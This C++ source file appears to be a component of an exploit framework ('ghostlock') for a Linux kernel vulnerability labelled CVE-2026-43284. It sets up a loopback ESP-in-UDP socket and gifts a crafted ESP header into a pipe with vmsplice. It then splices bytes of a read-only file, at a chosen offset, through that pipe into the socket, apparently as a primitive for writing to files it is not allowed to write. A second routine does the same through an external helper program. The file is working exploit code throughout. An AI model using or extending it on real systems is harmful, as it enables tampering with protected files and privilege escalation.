#include "backend/cve_2026_43284/lib/raw_esp.hpp"
#include "backend/cve_2026_43284/lib/helper.hpp"
#include "support/gl_log.h"

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#include <cerrno>
#include <cstring>
#include <sys/ioctl.h>

namespace ghostlock::backend::cve_2026_43284::lib {
namespace {
void set_error(RawEspError *error, const char *stage) noexcept {
    if (error == nullptr) return;
    error->stage = stage;
    error->err = errno;
}

void drain_pipe(int fd) noexcept {
    if (fd < 0) return;
    int available = 0;
    if (::ioctl(fd, FIONREAD, &available) != 0 || available <= 0) return;
    char scratch[128];
    while (available > 0) {
        const ssize_t n = ::read(fd, scratch, sizeof(scratch));
        if (n <= 0) break;
        available -= static_cast<int>(n);
    }
}
}  // namespace

bool gl_esp_open(std::uint32_t spi, std::uint16_t encap_port, std::uint16_t sender_port,
                 RawEspEndpoint *out, RawEspError *error) noexcept {
    verbose("gl_esp_open spi=%u encap=%u sender=%u", spi, encap_port, sender_port);
    if (error != nullptr) { error->stage = nullptr; error->err = 0; }
    if (out == nullptr || spi == 0) {
        debug("gl_esp_open branch=args-invalid");
        if (error != nullptr) { error->stage = "raw-open-args"; error->err = EINVAL; }
        return false;
    }
    out->sock = ::socket(AF_INET, SOCK_DGRAM, 0);
    if (out->sock < 0) { debug("gl_esp_open branch=socket-failed errno=%d", errno); set_error(error, "raw-socket"); return false; }
    int pipe_fds[2] = {-1, -1};
    if (::pipe(pipe_fds) < 0) {
        debug("gl_esp_open branch=pipe-failed errno=%d", errno);
        set_error(error, "raw-pipe");
        gl_esp_close(out);
        return false;
    }
    out->pipe_rd = pipe_fds[0];
    out->pipe_wr = pipe_fds[1];
    out->spi = spi;
    const int enable = 1;
    static_cast<void>(::setsockopt(out->sock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)));
    sockaddr_in source{};
    source.sin_family = AF_INET;
    source.sin_port = htons(sender_port);
    source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (::bind(out->sock, reinterpret_cast<sockaddr *>(&source), sizeof(source)) < 0) {
        set_error(error, "raw-bind");
        gl_esp_close(out);
        return false;
    }
    sockaddr_in destination{};
    destination.sin_family = AF_INET;
    destination.sin_port = htons(encap_port);
    destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (::connect(out->sock, reinterpret_cast<sockaddr *>(&destination), sizeof(destination)) < 0) {
        debug("gl_esp_open branch=connect-failed errno=%d", errno);
        set_error(error, "raw-connect");
        gl_esp_close(out);
        return false;
    }
    debug("gl_esp_open branch=ok sock=%d", out->sock);
    info("raw endpoint ready");
    return true;
}

bool gl_esp_write_block(const RawEspEndpoint &endpoint, const RawEspWrite &write,
                        RawEspError *error) noexcept {
    if (error != nullptr) { error->stage = nullptr; error->err = 0; }
    if (endpoint.sock < 0 || write.path == nullptr || write.iv == nullptr) {
        debug("gl_esp_write_block branch=args-invalid");
        if (error != nullptr) { error->stage = "raw-write-args"; error->err = EINVAL; }
        return false;
    }
    const int file = ::open(write.path, O_RDONLY | O_CLOEXEC);
    if (file < 0) { debug("gl_esp_write_block branch=open-failed errno=%d", errno); set_error(error, "raw-open-file"); return false; }
    const int pipe_rd = endpoint.pipe_rd;
    const int pipe_wr = endpoint.pipe_wr;
    if (pipe_rd < 0 || pipe_wr < 0) {
        set_error(error, "raw-pipe");
        ::close(file);
        return false;
    }
    std::uint8_t header[24] = {};
    const std::uint32_t spi = htonl(endpoint.spi);
    const std::uint32_t sequence = htonl(write.sequence);
    std::memcpy(header, &spi, 4U);
    std::memcpy(header + 4U, &sequence, 4U);
    std::memcpy(header + 8U, write.iv, 16U);
    iovec vector{};
    vector.iov_base = header;
    vector.iov_len = sizeof(header);
    bool ok = true;
    if (::vmsplice(pipe_wr, &vector, 1U, SPLICE_F_GIFT) != static_cast<ssize_t>(sizeof(header))) {
        set_error(error, "raw-vmsplice");
        ok = false;
    }
    off_t at = write.offset;
    if (ok && ::splice(file, &at, pipe_wr, nullptr, 16, SPLICE_F_MOVE) != 16) {
        set_error(error, "raw-splice-file");
        ok = false;
    }
    if (ok && ::splice(pipe_rd, nullptr, endpoint.sock, nullptr, 40, 0) != 40) {
        set_error(error, "raw-splice-udp");
        ok = false;
    }
    ::close(file);
    if (!ok) drain_pipe(pipe_rd);
    return ok;
}


bool gl_esp_write_block_via_helper(const RawEspEndpoint &endpoint, const RawEspWrite &write,
                                   const char *helper_path, RawEspError *error) noexcept {
    if (error != nullptr) { error->stage = nullptr; error->err = 0; }
    if (endpoint.sock < 0 || write.path == nullptr || write.iv == nullptr || helper_path == nullptr) {
        debug("gl_esp_write_block_via_helper branch=args-invalid");
        if (error != nullptr) { error->stage = "raw-helper-args"; error->err = EINVAL; }
        return false;
    }
    const int pipe_rd = endpoint.pipe_rd;
    const int pipe_wr = endpoint.pipe_wr;
    if (pipe_rd < 0 || pipe_wr < 0) { set_error(error, "raw-helper-pipe"); return false; }
    std::uint8_t header[24] = {};
    const std::uint32_t spi = htonl(endpoint.spi);
    const std::uint32_t sequence = htonl(write.sequence);
    std::memcpy(header, &spi, 4U);
    std::memcpy(header + 4U, &sequence, 4U);
    std::memcpy(header + 8U, write.iv, 16U);
    iovec vector{};
    vector.iov_base = header;
    vector.iov_len = sizeof(header);
    bool ok = true;
    if (::vmsplice(pipe_wr, &vector, 1U, SPLICE_F_GIFT) != static_cast<ssize_t>(sizeof(header))) {
        set_error(error, "raw-helper-vmsplice");
        ok = false;
    }
    if (ok) {
        ghostlock::backend::cve_2026_43284::lib::HelperError helper_error{};
        if (!gl_helper_exec(write.offset, write.path, pipe_wr, false, &helper_error)) {
            if (error != nullptr) {
                error->stage = helper_error.stage != nullptr ? helper_error.stage : "raw-helper-exec";
                error->err = helper_error.err;
            }
            ok = false;
        }
    }
    if (ok && ::splice(pipe_rd, nullptr, endpoint.sock, nullptr, 40, 0) != 40) {
        set_error(error, "raw-helper-splice-udp");
        ok = false;
    }
    if (!ok) drain_pipe(pipe_rd);
    return ok;
}

void gl_esp_close(RawEspEndpoint *endpoint) noexcept {
    verbose("gl_esp_close endpoint=%p", static_cast<void *>(endpoint));
    if (endpoint == nullptr) return;
    if (endpoint->sock >= 0) ::close(endpoint->sock);
    if (endpoint->pipe_rd >= 0) ::close(endpoint->pipe_rd);
    if (endpoint->pipe_wr >= 0) ::close(endpoint->pipe_wr);
    endpoint->sock = -1;
    endpoint->pipe_rd = -1;
    endpoint->pipe_wr = -1;
    endpoint->spi = 0;
}

}  // namespace ghostlock::backend::cve_2026_43284::lib
